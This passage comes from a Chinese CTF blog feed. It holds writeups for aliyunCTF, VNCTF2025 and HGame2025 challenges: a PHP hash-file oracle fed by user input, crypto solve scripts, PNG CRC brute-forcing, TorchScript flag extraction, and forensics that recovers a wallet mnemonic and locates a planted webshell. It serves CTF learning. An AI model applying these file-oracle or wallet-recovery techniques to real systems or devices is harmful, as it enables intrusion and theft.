class="variable">$func_template</span>, <span class="variable">$cached_key</span>, <span class="variable">$cached_key</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$func</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;algo&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file_hash</span> = <span class="title function_ invoke__">hash_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;algo&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$file_hash</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于参数c传入int$c，就会产生报错，我们就能从报错中看到文件哈希后的结果。</p><p>从phpinfo中我们可以看到可用的哈希算法</p><figure><imgsrc="/images/aliyunctf2025-misc-writeup-复现/image-20250227183144596.png"alt="image-20250227183144596" /><figcaption aria-hidden="true">image-20250227183144596</figcaption></figure><p>由于crc不是一种安全的算法，只要给出足够多不同的crc就有可能恢复出被加密的内容，而这里有三种可用的crc</p><figure><imgsrc="/images/aliyunctf2025-misc-writeup-复现/image-20250227183429546.png"alt="image-20250227183429546" /><figcaption aria-hidden="true">image-20250227183429546</figcaption></figure><figure><imgsrc="/images/aliyunctf2025-misc-writeup-复现/image-20250227183447325.png"alt="image-20250227183447325" /><figcaption aria-hidden="true">image-20250227183447325</figcaption></figure><figure><imgsrc="/images/aliyunctf2025-misc-writeup-复现/image-20250227183501701.png"alt="image-20250227183501701" /><figcaption aria-hidden="true">image-20250227183501701</figcaption></figure><p>官方给的<ahref="https://tangcuxiaojikuai.xyz/post/d79378e.html#more">脚本</a>不知道为什么跑不出来(</p><p>下面是一个密码爷的<ahref="https://tangcuxiaojikuai.xyz/post/d79378e.html#more">做法</a>，只能膜拜Orz</p><figure><imgsrc="/images/aliyunctf2025-misc-writeup-复现/image-20250227201333820.png"alt="image-20250227201333820" /><figcaption aria-hidden="true">image-20250227201333820</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> aliyunCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2025 Writeup</title>
      <link href="/posts/6f615b90/"/>
      <url>/posts/6f615b90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>其他的没看，就看了misc的取证看了一天没做出来，看了wp发现思路是对的，butyes，又是差那么一点点。。。</p></blockquote><h2 id="writeup部分">Writeup部分</h2><h3 id="misc">Misc</h3><h4 id="vn_lang">VN_Lang</h4><p>丢进IDA就能看到flag</p><figure><img src="/images/VNCTF2025-Writeup/image-20250208131104698.png"alt="image-20250208131104698" /><figcaption aria-hidden="true">image-20250208131104698</figcaption></figure><h3 id="crypto">Crypto</h3><h4 id="easymath">easymath</h4><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">l=flag.bit_length()//<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">n=[]</span><br><span class="line">N=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(n) &lt; <span class="number">3</span>:</span><br><span class="line">    p = <span class="number">4</span>*getPrime(l)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        n.append(p)</span><br><span class="line">        N *= p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;flag*flag%N&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, expand</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">polynomial = expand((x - n[<span class="number">0</span>]) * (x - n[<span class="number">1</span>]) * (x - n[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;polynomial=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"><span class="comment"># polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from libnum import n2s</span><br><span class="line">import gmpy2</span><br><span class="line">n0, n1, n2 = var(&#x27;n0 n1 n2&#x27;)</span><br><span class="line">equations = [</span><br><span class="line">    n0 + n1 + n2 == 15264966144147258587171776703005926730518438603688487721465,</span><br><span class="line">    n0*n1*n2 == 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619,</span><br><span class="line">    n0*n1 + n0*n2 + n1*n2 == 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span><br><span class="line">]</span><br><span class="line">solutions = solve(equations, n0, n1, n2)</span><br><span class="line"></span><br><span class="line">enc=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br><span class="line">ls=[5487564316951417093934647798659941512646442958127439071827, 3868765709106144154703556118635822400623994075212553582411, 5908636118089697338533572785710162817248001570348495067227]</span><br><span class="line">a,b,c=ls[0],ls[1],ls[2]</span><br><span class="line">N=a*b*c</span><br><span class="line">x=int(Mod(enc,a).sqrt())</span><br><span class="line">y=int(Mod(enc,b).sqrt())</span><br><span class="line">z=int(Mod(enc,c).sqrt())</span><br><span class="line">print(n2s(int(crt([x,y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([x,-y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([x,y,-z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,-y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,y,-z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([x,-y,-z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,-y,-z],[a,b,c]))))</span><br></pre></td></tr></table></figure><figure><img src="/images/VNCTF2025-Writeup/image-20250208131326192.png"alt="image-20250208131326192" /><figcaption aria-hidden="true">image-20250208131326192</figcaption></figure><h4 id="ss0hurt">ss0Hurt!</h4><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line">class DaMie:</span><br><span class="line">    def __init__(self, flag , n = None):</span><br><span class="line">        self.m = ZZ(bytes_to_long(flag))</span><br><span class="line">        self.n = n if n else getPrime(1024)</span><br><span class="line">        self.P = Zmod(self.n)</span><br><span class="line">        print(f&#x27;n = &#123;self.n&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    def process(self, x, y, z):</span><br><span class="line"></span><br><span class="line">        return vector([5 * x + y - 5 * z, 5 * y - z, 5 * z])</span><br><span class="line"></span><br><span class="line">    def Mat(self, m):</span><br><span class="line">        PR = self.P[&#x27;x,y,z&#x27;]</span><br><span class="line">        x,y,z = PR.gens()</span><br><span class="line"></span><br><span class="line">        if m != 0:</span><br><span class="line">            plana = self.Mat(m//2)</span><br><span class="line">            planb = plana(*plana)</span><br><span class="line">            if m % 2 == 0:</span><br><span class="line">                return planb</span><br><span class="line">            else:</span><br><span class="line">                return self.process(*planb)</span><br><span class="line">        else:</span><br><span class="line">            return self.process(*PR.gens())</span><br><span class="line"></span><br><span class="line">    def hash(self, A, B, C):</span><br><span class="line">        return self.Mat(self.m)(A, B, C)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    </span><br><span class="line">    Ouch = DaMie(flag)</span><br><span class="line">    result = Ouch.hash(2025,208,209)</span><br><span class="line">    print(f&#x27;hash(A,B,C) = &#123;result&#125;&#x27;)</span><br></pre></td></tr></table></figure><p>丢给ai一把梭了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的n和result（示例值，需替换为实际数据）</span></span><br><span class="line">n = <span class="number">106743081253087007974132382690669187409167641660258665859915640694456867788135702053312073228376307091325146727550371538313884850638568106223326195447798997814912891375244381751926653858549419946547894675646011818800255999071070352934719005006228971056393128007601573916373180007524930454138943896336817929823</span></span><br><span class="line">result = (<span class="number">17199707718762989481733793569240992776243099972784327196212023936622130204798694753865087501654381623876011128783229020278210160383185417670794284015692458326761011808048967854332413536183785458993128524881447529380387804712214305034841856237045463243243451585619997751904403447841431924053651568039257094910</span>, <span class="number">62503976674384744837417986781499538335164333679603320998241675970253762411134672614307594505442798271581593168080110727738181755339828909879977419645331630791420448736959554172731899301884779691119177400457640826361914359964889995618273843955820050051136401731342998940859792560938931787155426766034754760036</span>, <span class="number">93840121740656543170616546027906623588891573113673113077637257131079221429328035796416874995388795184080636312185908173422461254266536066991205933270191964776577196573147847000446118311985331680378772920169894541350064423243733498672684875039906829095473677927238488927923581806647297338935716890606987700071</span>)</span><br><span class="line"></span><br><span class="line">v1, v2, v3 = result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算5^m mod n</span></span><br><span class="line">inv_209 = inverse(<span class="number">209</span>, n)</span><br><span class="line">pow5m = (v3 * inv_209) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算5的逆元</span></span><br><span class="line">inv5 = inverse(<span class="number">5</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建线性同余方程求解m</span></span><br><span class="line">K = (pow5m * inv5 * <span class="number">209</span>) % n</span><br><span class="line">D = (pow5m * <span class="number">208</span> - v2) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    inv_K = inverse(K, n)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;K没有逆元，无法求解m&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">m = (D * inv_K) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证第三个方程以确保m正确</span></span><br><span class="line">inv2 = inverse(<span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">term1 = (pow5m * <span class="number">2025</span>) % n</span><br><span class="line"></span><br><span class="line">term2 = (m * inv5 % n) * pow5m % n</span><br><span class="line">term2 = (term2 * <span class="number">208</span>) % n</span><br><span class="line"></span><br><span class="line">term3 = (-m * pow5m % n) * <span class="number">209</span> % n</span><br><span class="line"></span><br><span class="line">term4_part = (m * (m - <span class="number">1</span>) % n) * inv2 % n</span><br><span class="line">term4 = term4_part * pow5m % n</span><br><span class="line">term4 = term4 * (inv5 * inv5 % n) % n</span><br><span class="line">term4 = (term4 * <span class="number">209</span>) % n</span><br><span class="line">term4 = (-term4) % n</span><br><span class="line"></span><br><span class="line">total = (term1 + term2 + term3 + term4) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> total != v1 % n:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;计算出的m未通过v1验证，可能存在问题&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密得到的flag为:&quot;</span>, flag)</span><br><span class="line"><span class="comment">#VNCTF&#123;WWhy_diagonalization_1s_s0_brRRRrRrrRrrrRrRRrRRrrrRrRrRuUuUUUTTTtte3333?????ouch!ouch!Th3t_is_S0_Crazy!!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="复现部分">复现部分</h2><h3 id="echo_flowers">echo_flowers</h3><p>imToken这个软件没有漏洞，因此是无法得知私钥的。在软件中可以看到账号是通过助记词导入的，因此猜测恢复助记词方法与输入法有关。</p><p>在android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict中找到词库</p><figure><img src="/images/VNCTF2025-Writeup/image-20250216165256719.png"alt="image-20250216165256719" /><figcaption aria-hidden="true">image-20250216165256719</figcaption></figure><p>词库中字符是以utf-16编码存储的，用strings解一下得到助记词</p><figure><img src="/images/VNCTF2025-Writeup/image-20250216170106186.png"alt="image-20250216170106186" /><figcaption aria-hidden="true">image-20250216170106186</figcaption></figure><p>正常进imToken导入一遍助记词即可创建钱包设置密码查看私钥</p><p>VNCTF{6433c196bb66b0d8ce3aa072d794822fd87edfbc3a30e2f2335a3fb437eb3cda}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame2025 Writeup</title>
      <link href="/posts/cf182765/"/>
      <url>/posts/cf182765/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于有点忙，只看了下week1，week2没空看了，就签了个到:(</p><p>还是学到了挺多东西的:)</p></blockquote><h2 id="签到">签到</h2><h3 id="test-nc">TEST NC</h3><p><img src="/images/HGame2025-Writeup/image-20250204110335189.png" alt="image-20250204110335189" style="zoom:50%;" /></p><h3 id="从这里开始的序章">从这里开始的序章</h3><figure><img src="/images/HGame2025-Writeup/image-20250204110440698.png"alt="image-20250204110440698" /><figcaption aria-hidden="true">image-20250204110440698</figcaption></figure><h2 id="misc">Misc</h2><h3 id="hakuya-want-a-girl-friend">Hakuya Want A Girl Friend</h3><p>一眼压缩包，把十六进制导入010，看到结尾有个倒过来的png</p><figure><img src="/images/HGame2025-Writeup/image-20250204110704834.png"alt="image-20250204110704834" /><figcaption aria-hidden="true">image-20250204110704834</figcaption></figure><p>提取出这个png以后发现crc有问题，爆破一下正确的宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#填入图片名</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)    </span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                       </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                    </span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><figure><img src="/images/HGame2025-Writeup/image-20250204110953878.png"alt="image-20250204110953878" /><figcaption aria-hidden="true">image-20250204110953878</figcaption></figure><figure><img src="/images/HGame2025-Writeup/image-20250204111036510.png"alt="image-20250204111036510" /><figcaption aria-hidden="true">image-20250204111036510</figcaption></figure><p>找到解压密码，解压得到flag</p><figure><img src="/images/HGame2025-Writeup/image-20250204111132330.png"alt="image-20250204111132330" /><figcaption aria-hidden="true">image-20250204111132330</figcaption></figure><h3 id="level-314-线性走廊中的双生实体">Level 314线性走廊中的双生实体</h3><p>先确认一下模型结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">entity = torch.jit.load(<span class="string">&#x27;entity.pt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name, module <span class="keyword">in</span> entity.named_modules():</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">linear1</span></span><br><span class="line"><span class="string">security</span></span><br><span class="line"><span class="string">relu</span></span><br><span class="line"><span class="string">linear2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>security层的代码中涉及了flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">entity = torch.jit.load(<span class="string">&#x27;entity.pt&#x27;</span>)</span><br><span class="line">security_layer = entity.security</span><br><span class="line"><span class="built_in">print</span>(security_layer.code)</span><br></pre></td></tr></table></figure><p>security层代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">    x: Tensor</span>) -&gt; Tensor:</span><br><span class="line">  _0 = torch.allclose(torch.mean(x), torch.tensor(<span class="number">0.31415000000000004</span>), <span class="number">1.0000000000000001e-05</span>, <span class="number">0.0001</span>)</span><br><span class="line">  <span class="keyword">if</span> _0:</span><br><span class="line">    _1 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">    flag = self.flag</span><br><span class="line">    <span class="keyword">for</span> _2 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(flag)):</span><br><span class="line">      b = flag[_2]</span><br><span class="line">      _3 = torch.append(_1, torch.<span class="built_in">chr</span>(torch.__xor__(b, <span class="number">85</span>)))</span><br><span class="line">    decoded = torch.join(<span class="string">&quot;&quot;</span>, _1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hidden:&quot;</span>, decoded)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">bool</span>(torch.gt(torch.mean(x), <span class="number">0.5</span>)):</span><br><span class="line">    _4 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">    fake_flag = self.fake_flag</span><br><span class="line">    <span class="keyword">for</span> _5 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(fake_flag)):</span><br><span class="line">      c = fake_flag[_5]</span><br><span class="line">      _6 = torch.append(_4, torch.<span class="built_in">chr</span>(torch.sub(c, <span class="number">3</span>)))</span><br><span class="line">    decoded0 = torch.join(<span class="string">&quot;&quot;</span>, _4)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decoy:&quot;</span>, decoded0)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>为什么要费心输入呢，直接输出flag它不香么()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i^<span class="number">85</span>) <span class="keyword">for</span> i <span class="keyword">in</span> torch.jit.load(<span class="string">&#x27;entity.pt&#x27;</span>).security.flag))</span><br><span class="line"><span class="comment">#flag&#123;s0_th1s_1s_r3al_s3cr3t&#125;</span></span><br></pre></td></tr></table></figure><h3 id="computer-cleaner">Computer cleaner</h3><p>题目</p><figure><img src="/images/HGame2025-Writeup/image-20250204112046437.png"alt="image-20250204112046437" /><figcaption aria-hidden="true">image-20250204112046437</figcaption></figure><p>给了个虚拟机，直接vmware挂载</p><p>不用多想，直奔/var/www/html先看看</p><figure><img src="/images/HGame2025-Writeup/image-20250204112251917.png"alt="image-20250204112251917" /><figcaption aria-hidden="true">image-20250204112251917</figcaption></figure><p>uploads/shell.php里面找到第一段flag</p><figure><img src="/images/HGame2025-Writeup/image-20250204112346641.png"alt="image-20250204112346641" /><figcaption aria-hidden="true">image-20250204112346641</figcaption></figure><p>查看upload_log.txt，找到攻击者ip</p><figure><img src="/images/HGame2025-Writeup/image-20250204112422363.png"alt="image-20250204112422363" /><figcaption aria-hidden="true">image-20250204112422363</figcaption></figure><p>访问一下就可以看到第二段flag</p><figure><img src="/images/HGame2025-Writeup/image-20250204112454353.png"alt="image-20250204112454353" /><figcaption aria-hidden="true">image-20250204112454353</figcaption></figure><p>从上面的日志中还可以看出第三段flag的位置</p><figure><img src="/images/HGame2025-Writeup/image-20250204112627198.png"alt="image-20250204112627198" /><figcaption aria-hidden="true">image-20250204112627198</figcaption></figure><h3 id="computer-cleaner-plus">Computer cleaner plus</h3><p>想ps的时候发现没权限，给了权限以后就看到后门程序了(?</p><figure><img src="/images/HGame2025-Writeup/image-20250210220834558.png"alt="image-20250210220834558" /><figcaption aria-hidden="true">image-20250210220834558</figcaption></figure><h2 id="crypto">Crypto</h2><h3 id="sieve">sieve</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(FLAG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trick</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">1</span>:</span><br><span class="line">        mul = prod(<span class="built_in">range</span>(<span class="number">1</span>,k)) </span><br><span class="line">        <span class="keyword">if</span> k - mul % k - <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> euler_phi(k) + trick(k-<span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> euler_phi(k) + trick(k-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = q = nextprime(trick(e^<span class="number">2</span>//<span class="number">6</span>)&lt;&lt;<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">enc = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一看就是算法爷出的题</p><p>用杜教筛算欧拉函数的前缀和，直接把<ahref="https://oi-wiki.org/math/number-theory/du/#__tabbed_2_2">oi-wiki</a>的代码拿来用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 